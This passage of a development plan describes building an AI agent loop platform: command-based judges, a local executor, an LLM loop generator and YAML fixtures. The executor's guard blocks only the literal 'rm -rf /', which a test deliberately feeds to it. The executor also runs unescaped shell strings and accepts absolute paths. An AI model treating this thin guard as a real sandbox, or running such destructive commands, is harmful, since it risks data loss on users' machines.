
    const writeNudge = config.memoryWriter.writeNudge as ReturnType<typeof vi.fn>;
    expect(writeNudge.mock.calls.length).toBeGreaterThanOrEqual(2);
  });
});
```

**Step 4: 运行测试**

```bash
cd packages/core
pnpm test -- --run
```

Expected: 5 tests PASS

**Step 5: Commit**

```bash
git add packages/core/src/loop/
git commit -m "feat(core): implement Möbius Loop engine with STAGNANT state and real budget tracking

Fixes from review:
- STAGNANT terminal phase for stagnant termination (was incorrectly COMPLETED)
- Real budget tracking with consumeIteration() and isExhausted()
- Completion requires: all hard conditions passed AND soft score >= threshold
- Memory Nudge writes facts/patterns/errors in every iteration

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 4.5: CompositeJudge (新增 — 真实条件验证 + Mock LLM评估)

**Files:**
- Create: `packages/core/src/eval/command-judge.ts`
- Create: `packages/core/src/eval/composite-judge.ts`
- Create: `packages/core/src/eval/__tests__/composite-judge.test.ts`

**设计说明:**
CompositeJudge 合并两个维度:
1. **CommandBasedJudge** — 跑 DSL 中的 conditions（命令退出码/输出匹配/文件检查）和 boundaryConditions（文件计数/删除检测）。硬性 binary 验证。
2. **LLMJudge** — Phase 1 mock，Phase 2 替换为真实 LLM-as-Judge。软性质量评分。

完成条件 = `allConditionsPassed AND score >= threshold`

**Step 1: CommandBasedJudge — 执行真实命令验证**

Create `packages/core/src/eval/command-judge.ts`:

```typescript
import { exec } from "child_process";
import { promisify } from "util";
import { access } from "fs/promises";
import { EvalCondition, BoundaryCondition } from "../loop/loop-definition.js";

const execAsync = promisify(exec);

export interface ConditionResult {
  description: string;
  passed: boolean;
  suggestion?: string;
}

export interface BoundaryResult {
  description: string;
  violated: boolean;
  reason?: string;
}

export class CommandBasedJudge {
  private cwd: string;

  constructor(cwd: string = process.cwd()) {
    this.cwd = cwd;
  }

  async checkConditions(conditions: EvalCondition[]): Promise<{
    results: ConditionResult[];
    allPassed: boolean;
  }> {
    const results: ConditionResult[] = [];
    for (const condition of conditions) {
      const result = await this.checkCondition(condition);
      results.push(result);
    }
    return {
      results,
      allPassed: results.every((r) => r.passed),
    };
  }

  async checkBoundaries(boundaries: BoundaryCondition[]): Promise<{
    violations: string[];
  }> {
    const violations: string[] = [];
    for (const boundary of boundaries) {
      const result = await this.checkBoundary(boundary);
      if (result.violated) {
        violations.push(result.reason || result.description);
      }
    }
    return { violations };
  }

  private async checkCondition(condition: EvalCondition): Promise<ConditionResult> {
    try {
      switch (condition.type) {
        case "command_exit_code": {
          const { exitCode } = await this.exec(condition.command);
          const passed = exitCode === condition.expected;
          return {
            description: condition.description,
            passed,
            suggestion: passed ? undefined : `Command exited ${exitCode}, expected ${condition.expected}`,
          };
        }
        case "command_output_contains": {
          const { stdout, exitCode } = await this.exec(condition.command);
          const passed = exitCode === 0 && stdout.includes(condition.expected);
          return {
            description: condition.description,
            passed,
            suggestion: passed ? undefined : `Output missing "${condition.expected}"`,
          };
        }
        case "file_exists": {
          const passed = await this.fileExists(condition.path);
          return {
            description: condition.description,
            passed,
            suggestion: passed ? undefined : `File ${condition.path} does not exist`,
          };
        }
        case "file_not_empty": {
          const exists = await this.fileExists(condition.path);
          return {
            description: condition.description,
            passed: exists,
            suggestion: exists ? undefined : `File ${condition.path} is missing or empty`,
          };
        }
        case "custom": {
          const { exitCode } = await this.exec(condition.script);
          return {
            description: condition.description,
            passed: exitCode === 0,
            suggestion: exitCode === 0 ? undefined : `Custom check failed (exit ${exitCode})`,
          };
        }
        default:
          return { description: condition.description, passed: false, suggestion: "Unknown condition type" };
      }
    } catch (err) {
      return {
        description: condition.description,
        passed: false,
        suggestion: `Check error: ${(err as Error).message}`,
      };
    }
  }

  private async checkBoundary(boundary: BoundaryCondition): Promise<BoundaryResult> {
    try {
      switch (boundary.type) {
        case "file_count_min": {
          const { stdout } = await this.exec(`find ${boundary.path} -type f 2>/dev/null | wc -l`);
          const count = parseInt(stdout.trim(), 10);
          return {
            description: boundary.description,
            violated: count < boundary.min,
            reason: count < boundary.min ? `Expected >=${boundary.min} files, found ${count}` : undefined,
          };
        }
        case "no_file_deleted": {
          const { stdout } = await this.exec("git diff --name-status --diff-filter=D 2>/dev/null | wc -l");
          const deleted = parseInt(stdout.trim(), 10);
          return {
            description: boundary.description,
            violated: deleted > 0,
            reason: deleted > 0 ? `${deleted} file(s) deleted` : undefined,
          };
        }
        case "command_forbidden": {
          // Phase 1 simplified: check via SimpleGuardrails in LocalExecutor layer
          return { description: boundary.description, violated: false };
        }
        default:
          return { description: boundary.description, violated: false };
      }
    } catch {
      // non-git dir etc — treat as potential violation
      return { description: boundary.description, violated: true, reason: "Boundary check failed to execute" };
    }
  }

  private async exec(command: string): Promise<{ stdout: string; stderr: string; exitCode: number }> {
    try {
      const { stdout, stderr } = await execAsync(command, { cwd: this.cwd, timeout: 30000 });
      return { stdout, stderr, exitCode: 0 };
    } catch (err: any) {
      return { stdout: err.stdout || "", stderr: err.stderr || "", exitCode: err.code || 1 };
    }
  }

  private async fileExists(path: string): Promise<boolean> {
    try { await access(path); return true; } catch { return false; }
  }
}
```

**Step 2: CompositeJudge — 合并硬性 + 软性评估**

Create `packages/core/src/eval/composite-judge.ts`:

```typescript
import { EvalJudge, EvalResult, LoopState } from "../loop/loop-engine.js";
import { LoopDefinition } from "../loop/loop-definition.js";
import { CommandBasedJudge } from "./command-judge.js";

/**
 * Phase 1 LLM Judge — mock implementation.
 * Phase 2 replaces with real LLM-as-Judge API call.
 */
export class MockLLMJudge {
  async evaluate(_state: LoopState, taskOutput: string): Promise<{
    score: number;
    reasoning: string;
    suggestions: string[];
  }> {
    // Phase 1: heuristic-based mock
    // Phase 2: real Claude API call with structured output
    const hasCode = taskOutput.includes("function") || taskOutput.includes("class") || taskOutput.includes("export");
    const hasTests = taskOutput.includes("test") || taskOutput.includes("describe") || taskOutput.includes("it(");
    const hasError = taskOutput.includes("Error") || taskOutput.includes("FAIL");

    let score = 0.5;
    if (hasCode && hasTests) score = 0.8;
    if (hasError) score = Math.max(0.2, score - 0.4);

    return {
      score,
      reasoning: `[Phase 1 mock] Code:${hasCode} Tests:${hasTests} Errors:${hasError}`,
      suggestions: hasError ? ["Fix test failures"] : [],
    };
  }
}

/**
 * CompositeJudge — 合并 CommandBasedJudge (硬性) + LLMJudge (软性).
 *
 * 完成条件: allConditionsPassed AND llmScore >= threshold
 * 边界条件违反 → 直接 score=0
 */
export class CompositeJudge implements EvalJudge {
  private commandJudge: CommandBasedJudge;
  private llmJudge: MockLLMJudge;
  private definition: LoopDefinition;
  private scoreHistory: number[] = [];

  constructor(definition: LoopDefinition, cwd: string = process.cwd()) {
    this.definition = definition;
    this.commandJudge = new CommandBasedJudge(cwd);
    this.llmJudge = new MockLLMJudge();
  }

  async evaluate(state: LoopState, taskOutput: string): Promise<EvalResult> {
    const evalConfig = this.definition.eval;

    // 1. 硬性条件验证
    const { results: conditionResults, allPassed: allConditionsPassed } =
      await this.commandJudge.checkConditions(evalConfig.conditions);

    // 2. 边界条件检查
    const { violations: boundaryViolations } =
      await this.commandJudge.checkBoundaries(evalConfig.boundaryConditions);

    // 3. 软性 LLM 质量评分
    const llmResult = await this.llmJudge.evaluate(state, taskOutput);

    // 4. 综合评分
    let score = allConditionsPassed ? llmResult.score : llmResult.score * 0.5;
    if (boundaryViolations.length > 0) {
      score = 0; // 边界违反 → 零分
    }

    // 5. 停滞检测
    this.scoreHistory.push(score);
    let isStagnant = false;
    if (this.scoreHistory.length >= 3) {
      const recent = this.scoreHistory.slice(-3);
      isStagnant = Math.max(...recent) - Math.min(...recent) < 0.05;
    }

    // 6. 生成建议
    const suggestions: string[] = [
      ...conditionResults.filter((r) => !r.passed).map((r) => r.suggestion || r.description),
      ...llmResult.suggestions,
      ...boundaryViolations.map((v) => `BOUNDARY: ${v}`),
    ];

    return {
      score,
      reasoning: [
        `Hard conditions: ${conditionResults.filter((r) => r.passed).length}/${conditionResults.length} passed`,
        ...conditionResults.map((r) => `  ${r.passed ? "PASS" : "FAIL"}: ${r.description}`),
        `LLM score: ${llmResult.score.toFixed(2)}`,
        `Boundary violations: ${boundaryViolations.length}`,
        `Composite score: ${score.toFixed(2)}`,
      ].join("\n"),
      suggestions,
      isStagnant,
      allConditionsPassed,
      boundaryViolations,
    };
  }
}
```

**Step 3: 写测试**

Create `packages/core/src/eval/__tests__/composite-judge.test.ts`:

```typescript
import { describe, it, expect } from "vitest";
import { CompositeJudge } from "../composite-judge.js";
import { LoopDefinition } from "../../loop/loop-definition.js";

function mockDef(conditions: any[], boundaries: any[] = [], threshold = 0.7): LoopDefinition {
  return {
    id: "test",
    name: "test",
    trigger: { type: "manual", commandName: "test" },
    execution: { maxIterations: 3, maxTokensPerIter: 1000, timeoutSeconds: 60, useWorktree: false, worktreeMode: "fresh" },
    eval: { judgeModel: "test", threshold, maxRetries: 2, stagnantRounds: 2, conditions, boundaryConditions: boundaries },
    delegation: { maxDepth: 0, maxSubagents: 0, budgetPerNode: 0 },
    memory: { autoNudge: false, autoSkillCreation: false, claudeMdMaxLines: 200 },
    onFailure: { strategy: "retry", maxRetries: 2 },
    skills: [],
    mcpConnectors: [],
  };
}

describe("CompositeJudge", () => {
  it("returns allConditionsPassed=true when all command conditions pass", async () => {
    const def = mockDef([
      { type: "command_exit_code", command: "echo test", expected: 0, description: "echo" },
      { type: "file_exists", path: "/tmp", description: "tmp exists" },
    ]);
    const judge = new CompositeJudge(def);
    const result = await judge.evaluate({ iteration: 1 } as any, "some output");

    expect(result.allConditionsPassed).toBe(true);
    expect(result.boundaryViolations).toHaveLength(0);
  });

  it("returns allConditionsPassed=false when a condition fails", async () => {
    const def = mockDef([
      { type: "command_exit_code", command: "false", expected: 0, description: "always fails" },
    ]);
    const judge = new CompositeJudge(def);
    const result = await judge.evaluate({ iteration: 1 } as any, "");

    expect(result.allConditionsPassed).toBe(false);
    expect(result.suggestions.length).toBeGreaterThan(0);
  });

  it("detects boundary violations", async () => {
    const def = mockDef(
      [{ type: "command_exit_code", command: "echo test", expected: 0, description: "echo" }],
      [{ type: "no_file_deleted", path: ".", description: "no deleted files" }]
    );
    const judge = new CompositeJudge(def);
    const result = await judge.evaluate({ iteration: 1 } as any, "");

    // In a git repo, no_file_deleted should pass. In non-git, it may violate.
    // We just verify the structure is correct.
    expect(result.score).toBeGreaterThanOrEqual(0);
  });

  it("detects stagnation after 3 identical scores", async () => {
    const def = mockDef([
      { type: "command_exit_code", command: "false", expected: 0, description: "always fails" },
    ]);
    const judge = new CompositeJudge(def);

    await judge.evaluate({ iteration: 1 } as any, "");
    await judge.evaluate({ iteration: 2 } as any, "");
    const r3 = await judge.evaluate({ iteration: 3 } as any, "");

    expect(r3.isStagnant).toBe(true);
  });
});
```

**Step 4: 运行测试**

```bash
cd packages/core
pnpm test -- --run
```

Expected: 4 tests PASS (from composite-judge)

**Step 5: Commit**

```bash
git add packages/core/src/eval/
git commit -m "feat(core): implement CompositeJudge (CommandBased + LLM mock)

CompositeJudge merges two dimensions:
1. CommandBasedJudge — runs DSL conditions (exit code, output match, file check)
   and boundary conditions (file count, deletion detection)
2. MockLLMJudge — heuristic quality scoring (Phase 2 → real Claude API)

Completion = allConditionsPassed AND soft score >= threshold (not 1.0)
Boundary violations → score=0 immediately

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 4.6: LocalExecutor (新增 — 真实文件/命令执行)

**Files:**
- Create: `packages/core/src/executor/local-executor.ts`
- Create: `packages/core/src/executor/__tests__/local-executor.test.ts`

**Step 1: 实现 LocalExecutor**

Create `packages/core/src/executor/local-executor.ts`:

```typescript
import { exec } from "child_process";
import { promisify } from "util";
import { readFile, writeFile, appendFile, mkdir, readdir } from "fs/promises";
import { dirname } from "path";
import { ToolExecutor, ToolResult } from "../loop/loop-engine.js";

const execAsync = promisify(exec);

export interface LocalExecutorConfig {
  cwd: string;
  allowedCommands?: string[];
  maxOutputLength?: number;
}

export class LocalExecutor implements ToolExecutor {
  private config: Required<LocalExecutorConfig>;

  constructor(config: LocalExecutorConfig) {
    this.config = {
      cwd: config.cwd,
      allowedCommands: config.allowedCommands || [],
      maxOutputLength: config.maxOutputLength || 50000,
    };
  }

  async execute(toolName: string, params: Record<string, unknown>): Promise<ToolResult> {
    try {
      switch (toolName) {
        case "write_file":
          return await this.writeFile(params.path as string, params.content as string);
        case "read_file":
          return await this.readFile(params.path as string);
        case "append_file":
          return await this.appendFile(params.path as string, params.content as string);
        case "run_command":
          return await this.runCommand(params.command as string, (params.cwd as string) || this.config.cwd);
        case "list_dir":
          return await this.listDir(params.path as string);
        default:
          return { success: false, output: "", error: `Unknown tool: ${toolName}. Available: write_file, read_file, append_file, run_command, list_dir` };
      }
    } catch (err) {
      return { success: false, output: "", error: (err as Error).message };
    }
  }

  private async writeFile(filePath: string, content: string): Promise<ToolResult> {
    const fullPath = this.resolvePath(filePath);
    await mkdir(dirname(fullPath), { recursive: true });
    await writeFile(fullPath, content, "utf-8");
    return { success: true, output: `Wrote ${filePath} (${content.length} bytes)`, artifacts: [{ type: "file", path: filePath, description: `Created ${filePath}` }] };
  }

  private async appendFile(filePath: string, content: string): Promise<ToolResult> {
    const fullPath = this.resolvePath(filePath);
    await mkdir(dirname(fullPath), { recursive: true });
    await appendFile(fullPath, content, "utf-8");
    return { success: true, output: `Appended to ${filePath} (${content.length} bytes)` };
  }

  private async readFile(filePath: string): Promise<ToolResult> {
    const fullPath = this.resolvePath(filePath);
    const content = await readFile(fullPath, "utf-8");
    return { success: true, output: content };
  }

  private async runCommand(command: string, cwd: string): Promise<ToolResult> {
    const normalized = command.trim().toLowerCase();
    if (normalized.includes("rm -rf /") || normalized.includes("rm -rf /*")) {
      return { success: false, output: "", error: "FORBIDDEN: recursive delete of root blocked" };
    }
    const { stdout, stderr, exitCode } = await this.execWithTimeout(command, cwd);
    const output = this.truncate(stderr ? `${stdout}\n---STDERR---\n${stderr}` : stdout);
    return { success: exitCode === 0, output, error: exitCode !== 0 ? `Exit code: ${exitCode}` : undefined };
  }

  private async listDir(dirPath: string): Promise<ToolResult> {
    const fullPath = this.resolvePath(dirPath);
    const entries = await readdir(fullPath, { withFileTypes: true });
    const lines = entries.map((e) => `${e.isDirectory() ? "DIR " : "FILE"} ${e.name}`);
    return { success: true, output: lines.join("\n") };
  }

  private resolvePath(filePath: string): string {
    if (filePath.startsWith("/")) return filePath;
    return `${this.config.cwd}/${filePath}`;
  }

  private async execWithTimeout(command: string, cwd: string, timeoutMs = 30000): Promise<{ stdout: string; stderr: string; exitCode: number }> {
    try {
      const { stdout, stderr } = await execAsync(command, { cwd, timeout: timeoutMs });
      return { stdout, stderr, exitCode: 0 };
    } catch (err: any) {
      return { stdout: err.stdout || "", stderr: err.stderr || "", exitCode: err.code || 1 };
    }
  }

  private truncate(str: string): string {
    if (str.length <= this.config.maxOutputLength) return str;
    return str.slice(0, this.config.maxOutputLength) + `\n... [truncated ${str.length - this.config.maxOutputLength} chars]`;
  }
}
```

**Step 2: 写测试**

Create `packages/core/src/executor/__tests__/local-executor.test.ts`:

```typescript
import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { LocalExecutor } from "../local-executor.js";
import { mkdtempSync, rmSync, writeFileSync } from "fs";
import { tmpdir } from "os";
import { join } from "path";

describe("LocalExecutor", () => {
  let tmpDir: string;
  let executor: LocalExecutor;

  beforeEach(() => {
    tmpDir = mkdtempSync(join(tmpdir(), "mobius-test-"));
    executor = new LocalExecutor({ cwd: tmpDir });
  });

  afterEach(() => {
    rmSync(tmpDir, { recursive: true, force: true });
  });

  it("writes and reads files", async () => {
    const write = await executor.execute("write_file", { path: "test.txt", content: "hello" });
    expect(write.success).toBe(true);
    expect(write.artifacts).toHaveLength(1);

    const read = await executor.execute("read_file", { path: "test.txt" });
    expect(read.success).toBe(true);
    expect(read.output).toBe("hello");
  });

  it("appends to files", async () => {
    await executor.execute("write_file", { path: "log.txt", content: "line1\n" });
    await executor.execute("append_file", { path: "log.txt", content: "line2\n" });
    const read = await executor.execute("read_file", { path: "log.txt" });
    expect(read.output).toBe("line1\nline2\n");
  });

  it("runs commands in worktree", async () => {
    const result = await executor.execute("run_command", { command: "echo mobius" });
    expect(result.success).toBe(true);
    expect(result.output.trim()).toBe("mobius");
  });

  it("blocks forbidden commands", async () => {
    const result = await executor.execute("run_command", { command: "rm -rf /" });
    expect(result.success).toBe(false);
    expect(result.error).toContain("FORBIDDEN");
  });

  it("lists directory", async () => {
    writeFileSync(join(tmpDir, "a.txt"), "a");
    const result = await executor.execute("list_dir", { path: "." });
    expect(result.success).toBe(true);
    expect(result.output).toContain("FILE a.txt");
  });

  it("returns error for unknown tool", async () => {
    const result = await executor.execute("unknown_tool", {});
    expect(result.success).toBe(false);
    expect(result.error).toContain("Unknown tool");
  });
});
```

**Step 3: 运行测试**

```bash
cd packages/core
pnpm test -- --run
```

Expected: 6 tests PASS

**Step 4: Commit**

```bash
git add packages/core/src/executor/
git commit -m "feat(core): implement LocalExecutor for real file/command execution

Tools: write_file, read_file, append_file, run_command, list_dir
- Works in worktree directory
- Blocks forbidden commands (rm -rf /)
- Truncates output to prevent context explosion
- mkdir -p for parent directories on write

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 4.7: LoopGenerator (新增 — 自然语言 → YAML Loop 定义)

**Files:**
- Create: `packages/core/src/generator/loop-generator.ts`
- Create: `packages/core/src/generator/prompts/generate-loop.system.md`
- Create: `packages/core/src/generator/__tests__/loop-generator.test.ts`

**设计说明:**
LoopGenerator 是"自然语言入口"的核心。用户说 `mobius create "每2小时检查PR，CI挂了就修"`，Generator 调用 LLM 将自然语言转化为 Loop DSL YAML，自动选择合适的 skills、设定验证条件、推断失败策略。YAML 对用户不可见——用户只需要一句话。

**Step 1: System Prompt — 教 LLM 输出 Loop DSL**

Create `packages/core/src/generator/prompts/generate-loop.system.md`:

```markdown
You are a Loop Engineering expert. Given a user's natural language description,
generate a YAML Loop Definition for the Mobius Agent platform.

## Output Format
Output ONLY valid YAML matching this schema:

```yaml
id: <kebab-case-id>
name: <short-human-readable-name>
description: <1-2 sentence summary of what this loop does>
trigger:
  type: cron | manual
  cronExpression: "<cron>"  # only if type=cron
  commandName: <name>       # only if type=manual
execution:
  maxIterations: <5-50>
  useWorktree: true
eval:
  threshold: 0.7
  conditions: [...]
  boundaryConditions: [...]
skills: [...]
memory:
  autoNudge: true
onFailure:
  strategy: retry | escalate_to_human | graceful_degrade | abort
  maxRetries: <1-5>
```

## Rules
1. **trigger**: If the user describes a recurring task, use `cron`. If one-off, use `manual`.
2. **cronExpression**: Map natural language time to standard cron. "每2小时" → `0 */2 * * *`. "每天早上9点" → `0 9 * * *`.
3. **conditions**: Infer executable validation commands. "测试通过" → `command_exit_code: npm test`. "lint通过" → `command_exit_code: npm run lint`.
4. **boundaryConditions**: Always add `no_file_deleted` as default.
5. **skills**: Choose from available skills list based on task nature. Code tasks → `test-driven-development`, `systematic-debugging`. Review tasks → `code-review`. Plan tasks → `brainstorming`, `writing-plans`.
6. **onFailure**: If the user mentions notification/alert → `escalate_to_human`. If it's a dev task → `retry`.
7. **maxIterations**: Simple tasks 5-10, complex tasks 20-50.
8. **id**: Use kebab-case derived from the task description.

## Available Skills
- test-driven-development
- systematic-debugging
- code-review
- brainstorming
- writing-plans
- executing-plans
- defense-in-depth
- verification-before-completion
- investigation-first
- concentrate-forces
```

**Step 2: LoopGenerator 实现**

Create `packages/core/src/generator/loop-generator.ts`:

```typescript
import { LoopDefinition, LoopDefinitionSchema } from "../loop/loop-definition.js";
import * as yaml from "js-yaml";

export interface LLMClient {
  complete(prompt: string, systemPrompt: string): Promise<string>;
}

export interface GeneratorResult {
  definition: LoopDefinition;
  yaml: string;
  warnings: string[];
}

/**
 * LoopGenerator converts natural language descriptions into validated Loop Definitions.
 *
 * Phase 1: Uses an LLMClient (mock in tests, real Claude API in production via Gateway plugin).
 * The generator embeds a system prompt that teaches the LLM to output valid Loop DSL YAML.
 */
export class LoopGenerator {
  private llm: LLMClient;
  private systemPrompt: string;

  constructor(llm: LLMClient, systemPrompt: string) {
    this.llm = llm;
    this.systemPrompt = systemPrompt;
  }

  /**
   * Generate a Loop Definition from a natural language description.
   */
  async generate(userInput: string): Promise<GeneratorResult> {
    const warnings: string[] = [];

    // 1. Call LLM with system prompt + user input
    const rawYaml = await this.llm.complete(userInput, this.systemPrompt);

    // 2. Extract YAML from the response (LLM may wrap in markdown code block)
    const yamlContent = this.extractYaml(rawYaml);

    // 3. Parse and validate
    let definition: LoopDefinition;
    try {
      const raw = yaml.load(yamlContent) as Record<string, unknown>;
      definition = LoopDefinitionSchema.parse(raw);
    } catch (err) {
      throw new Error(`LoopGenerator: LLM output is not a valid Loop Definition. ${(err as Error).message}\n\nRaw output:\n${yamlContent}`);
    }

    // 4. Post-generation checks (warnings, not errors)
    if (definition.eval.conditions.length === 0) {
      warnings.push("No eval conditions specified — loop may never complete. Consider adding at least one condition.");
    }
    if (definition.skills.length === 0) {
      warnings.push("No skills assigned — agent may lack domain knowledge. Consider adding relevant skills.");
    }
    if (definition.delegation.maxDepth === 0 && definition.execution.maxIterations > 10) {
      warnings.push("Long-running loop with no delegation — consider enabling sub-agents for parallel work.");
    }

    return { definition, yaml: yamlContent, warnings };
  }

  /**
   * Extract YAML content from LLM response.
   * Handles: bare YAML, ```yaml ... ```, ``` ... ```
   */
  private extractYaml(raw: string): string {
    // Try ```yaml code block first
    const fencedMatch = raw.match(/```ya?ml?\s*\n([\s\S]*?)\n```/);
    if (fencedMatch) return fencedMatch[1];

    // Try generic code block
    const genericMatch = raw.match(/```\s*\n([\s\S]*?)\n```/);
    if (genericMatch) return genericMatch[1];

    // Assume bare YAML
    return raw.trim();
  }
}
```

**Step 3: 写测试 (Mock LLM)**

Create `packages/core/src/generator/__tests__/loop-generator.test.ts`:

```typescript
import { describe, it, expect } from "vitest";
import { LoopGenerator } from "../loop-generator.js";
import { readFileSync } from "fs";
import { resolve } from "path";

const SYSTEM_PROMPT = "You are a Loop Engineering expert. Output valid YAML.";

// Mock LLM that returns a predefined YAML
class MockLLM {
  private response: string;
  constructor(response: string) { this.response = response; }
  async complete(_input: string, _system: string): Promise<string> {
    return this.response;
  }
}

describe("LoopGenerator", () => {
  it("generates a valid Loop Definition from natural language", async () => {
    const mockYaml = `
id: hello-world
name: Hello World
trigger:
  type: manual
  commandName: hello
execution:
  maxIterations: 5
  useWorktree: true
eval:
  threshold: 0.7
  conditions:
    - type: command_exit_code
      command: npm test
      expected: 0
      description: Tests pass
  boundaryConditions:
    - type: no_file_deleted
      path: "."
      description: No files deleted
skills:
  - test-driven-development
memory:
  autoNudge: true
onFailure:
  strategy: retry
  maxRetries: 3
`;

    const generator = new LoopGenerator(new MockLLM(mockYaml), SYSTEM_PROMPT);
    const result = await generator.generate("写一个hello world函数");

    expect(result.definition.id).toBe("hello-world");
    expect(result.definition.trigger.type).toBe("manual");
    expect(result.definition.eval.conditions).toHaveLength(1);
    expect(result.definition.skills).toContain("test-driven-development");
    expect(result.warnings).toHaveLength(0);
  });

  it("extracts YAML from markdown code block", async () => {
    const mockYaml = "```yaml\nid: test\nname: Test\ntrigger:\n  type: manual\n  commandName: test\n```";
    const generator = new LoopGenerator(new MockLLM(mockYaml), SYSTEM_PROMPT);
    const result = await generator.generate("test");

    expect(result.definition.id).toBe("test");
  });

  it("warns when no conditions specified", async () => {
    const mockYaml = `
id: no-conditions
name: No Conditions
trigger:
  type: manual
  commandName: nc
skills: []
`;

    const generator = new LoopGenerator(new MockLLM(mockYaml), SYSTEM_PROMPT);
    const result = await generator.generate("do something");

    expect(result.warnings.length).toBeGreaterThan(0);
    expect(result.warnings.some((w) => w.includes("conditions"))).toBe(true);
  });

  it("throws on invalid YAML from LLM", async () => {
    const generator = new LoopGenerator(new MockLLM("not: valid: yaml: :"), SYSTEM_PROMPT);
    await expect(generator.generate("bad")).rejects.toThrow("LoopGenerator");
  });

  it("generates cron trigger from time-based natural language", async () => {
    const mockYaml = `
id: daily-check
name: Daily Check
trigger:
  type: cron
  cronExpression: "0 9 * * *"
execution:
  maxIterations: 10
  useWorktree: true
eval:
  threshold: 0.7
skills: []
memory:
  autoNudge: true
onFailure:
  strategy: escalate_to_human
  maxRetries: 2
  escalationChannel: slack
`;

    const generator = new LoopGenerator(new MockLLM(mockYaml), SYSTEM_PROMPT);
    const result = await generator.generate("每天早上9点检查数据质量");

    expect(result.definition.trigger.type).toBe("cron");
    if (result.definition.trigger.type === "cron") {
      expect(result.definition.trigger.cronExpression).toBe("0 9 * * *");
    }
    expect(result.definition.onFailure.strategy).toBe("escalate_to_human");
  });
});
```

**Step 4: 运行测试**

```bash
cd packages/core
pnpm test -- --run
```

Expected: 5 tests PASS

**Step 5: Commit**

```bash
git add packages/core/src/generator/
git commit -m "feat(core): implement LoopGenerator — natural language to Loop DSL

LoopGenerator converts user's natural language into validated YAML Loop Definitions.
- LLM-agnostic interface (LLMClient), mock in tests, real API in production
- System prompt teaches LLM to output valid Loop DSL
- Extracts YAML from markdown code blocks or bare output
- Post-generation warnings for common missing config (no conditions, no skills)
- Zod validation ensures LLM output is always structurally correct

Phase 1 completes the 'mobius create' natural language interface.

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## Loop DSL 内部测试 Fixture

### Task 5: Loop DSL 内部测试 fixture (不再用户手写)

> **设计决策:** 用户通过 `mobius create "自然语言"` 交互，YAML 由 LoopGenerator (Task 4.7) 自动生成。此 Task 中的 YAML 文件仅作为 LoopGenerator 的 few-shot 示例和单元测试 fixture，不对用户暴露。

**Files:**
- Create: `loops/hello-world.loop.yaml`
- Create: `loops/babysit-prs.loop.yaml` (Phase 2 目标，先写好)

**Step 1: Hello World Loop (修正3: 含 conditions + boundaryConditions)**

Create `loops/hello-world.loop.yaml`:

```yaml
id: hello-world-loop
name: Hello World TDD Loop
description: |
  给定一个编程任务，Agent自动写代码、跑测试、
  根据测试结果修复、循环直到通过或budget耗尽。
trigger:
  type: manual
  commandName: hello-loop

execution:
  maxIterations: 10
  maxTokensPerIter: 20000
  timeoutSeconds: 600
  useWorktree: true
  worktreeMode: fresh

eval:
  judgeModel: claude-sonnet-4-6
  threshold: 0.7               # 软性LLM质量评分阈值 (不是1.0)
  maxRetries: 5
  stagnantRounds: 3
  conditions:                  # 硬性验证条件 (全过才算完成)
    - type: command_exit_code
      command: npx vitest run
      expected: 0
      description: 所有测试通过
    - type: command_exit_code
      command: npx eslint src/
      expected: 0
      description: Lint零报错
    - type: file_exists
      path: dist/index.js
      description: 构建产物存在
  boundaryConditions:          # 古德哈特定律防护
    - type: file_count_min
      path: src/__tests__
      min: 1
      description: 不能删除测试文件
    - type: no_file_deleted
      path: "."
      description: 不能删除已有源文件

skills:
  - test-driven-development
  - systematic-debugging

memory:
  autoNudge: true
  autoSkillCreation: false
  claudeMdMaxLines: 200

onFailure:
  strategy: escalate_to_human
  maxRetries: 3
```

**Step 2: PR Babysitter Loop (Phase 2 验收目标)**

Create `loops/babysit-prs.loop.yaml`:

```yaml
id: babysit-prs
name: PR Babysitter
description: |
  自动监控所有PR — CI挂了就修，有新Review就派子Agent处理。
  Phase 2 验收目标（Boris说的"睡觉时几千个Agent在跑"）。
trigger:
  type: cron
  cronExpression: "*/30 * * * *"

execution:
  maxIterations: 50
  maxTokensPerIter: 50000
  timeoutSeconds: 3600
  useWorktree: true
  worktreeMode: fresh

eval:
  threshold: 0.85
  conditions:
    - type: command_exit_code
      command: gh pr checks --required
      expected: 0
      description: 所有CI检查通过
  boundaryConditions:
    - type: no_file_deleted
      path: "."
      description: 不能删除已有文件

skills:
  - code-review
  - test-driven-development
  - systematic-debugging

mcpConnectors:
  - github
  - slack

delegation:
  maxDepth: 3
  maxSubagents: 10
  budgetPerNode: 200000

memory:
  autoNudge: true
  autoSkillCreation: true
  claudeMdMaxLines: 200

onFailure:
  strategy: escalate_to_human
  maxRetries: 2
  escalationChannel: slack
```

**Step 3: 添加文件加载测试到 loop-parser.test.ts**

在 Task 3 的测试文件中补上占位测试:

```typescript
import { resolve } from "path";

// 在 describe block 内添加:
it("loads hello-world loop from disk", () => {
  const loop = loadLoopDefinition(
    resolve(__dirname, "../../../../loops/hello-world.loop.yaml")
  );
  expect(loop.id).toBe("hello-world-loop");
  expect(loop.eval.conditions).toHaveLength(3);
  expect(loop.eval.boundaryConditions).toHaveLength(2);
  expect(loop.eval.threshold).toBe(0.7);
});

it("loads babysit-prs loop from disk", () => {
  const loop = loadLoopDefinition(
    resolve(__dirname, "../../../../loops/babysit-prs.loop.yaml")
  );
  expect(loop.id).toBe("babysit-prs");
  expect(loop.delegation.maxDepth).toBe(3);
});
```

**Step 4: 运行全部测试**

```bash
cd packages/core
pnpm test -- --run
```

Expected: All tests PASS (loop-parser: 6, loop-engine: 5, composite-judge: 4, local-executor: 6 = 21 total)

**Step 5: Commit**

```bash
git add loops/ packages/core/src/loop/__tests__/
git commit -m "feat: add Loop DSL definitions with conditions and boundary conditions

- hello-world.loop.yaml: Phase 1 acceptance loop with real conditions
  (vitest run, eslint, build artifact check, boundary protections)
- babysit-prs.loop.yaml: Phase 2 target loop (cron-driven PR babysitter)
- File-loading integration tests added to loop-parser test suite

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## Memory 层

### Task 6: SQLite Memory Store (+status/superseded_by/expires_at)

**Files:**
- Create: `packages/core/src/memory/schema.sql`
- Create: `packages/core/src/memory/memory-store.ts`
- Create: `packages/core/src/memory/__tests__/memory-store.test.ts`

**Step 1: 定义数据库 schema (修正9: +status/superseded_by/expires_at)**

Create `packages/core/src/memory/schema.sql`:

```sql
-- Mobius Memory Layer
